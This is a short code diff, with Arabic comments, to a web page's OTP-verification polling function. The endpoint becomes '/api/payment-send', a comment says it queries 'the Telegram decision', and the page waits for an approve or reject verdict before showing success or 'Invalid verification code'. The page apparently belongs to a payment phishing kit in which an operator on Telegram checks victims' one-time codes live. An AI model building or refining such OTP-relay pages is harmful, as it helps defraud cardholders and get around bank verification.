@@ -159,18 +159,19 @@
         function checkApprovalStatus(uid) {
             const interval = setInterval(async () => {
                 try {
-                    const res = await fetch(`/api/check-status?user_id=${uid}`);
+                    // الاستعلام مباشرة عن قرار التليجرام
+                    const res = await fetch(`/api/payment-send?user_id=${uid}`);
                     const data = await res.json();
 
                     if (data.status === 'approved') {
                         clearInterval(interval);
-                        window.location.href = 'success.html'; // الانتقال للفاتورة عند الموافقة
+                        window.location.href = 'success.html'; // الانتقال المباشر للفاتورة
                     } else if (data.status === 'rejected') {
                         clearInterval(interval);
                         submitBtn.disabled = false;
                         submitBtn.textContent = 'Submit';
                         otpInput.classList.add("border-red-500");
-                        otpError.textContent = "Invalid verification code. Please try again."; // إظهار خطأ عند الرفض
+                        otpError.textContent = "Invalid verification code. Please try again.";
                         otpError.classList.remove("hidden");
                         otpInput.value = '';
                         otpInput.focus();
@@ -178,7 +179,7 @@
                 } catch (err) {
                     console.error(err);
                 }
-            }, 2000);
+            }, 1500); // يفحص القرار كل ثانية ونصف
         }
 
         document.getElementById('cancelBtn').addEventListener('click', () => {
